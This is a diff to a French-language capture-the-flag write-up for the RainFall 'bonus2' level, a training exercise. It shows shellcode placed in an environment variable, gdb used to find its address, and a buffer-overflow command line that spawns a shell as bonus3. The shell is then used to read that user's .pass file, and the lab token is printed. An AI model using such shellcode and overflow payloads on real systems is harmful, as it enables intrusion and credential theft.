@@ -56,3 +56,29 @@ Shellcode : '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x8
 export LANG=$(python -c 'print("nl" + "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
 # Encore une fois, comme avant on rajoute du padding pour etre sur que les arguments n'interfèrent pas
 ```
+
+Puis on trouve l'adresse de notre variable d'environement:
+
+```
+(gdb) b main
+Breakpoint 1 at 0x804852f
+(gdb) r
+Starting program: /home/user/bonus2/bonus2
+
+Breakpoint 1, 0x0804852f in main ()
+(gdb) x/s *environ
+0xbfffe8b8
+```
+
+Enfin on fait donc:
+Avec 40 bytes de padding et 23 pour la langue = nl
+
+
+```
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "Y"*23 + "\xb8\xe8\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYYYYYYYYYYYYYYYYYYYYYYY����
+bash-4.2$ whoami
+bonus3
+bash-4.2$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
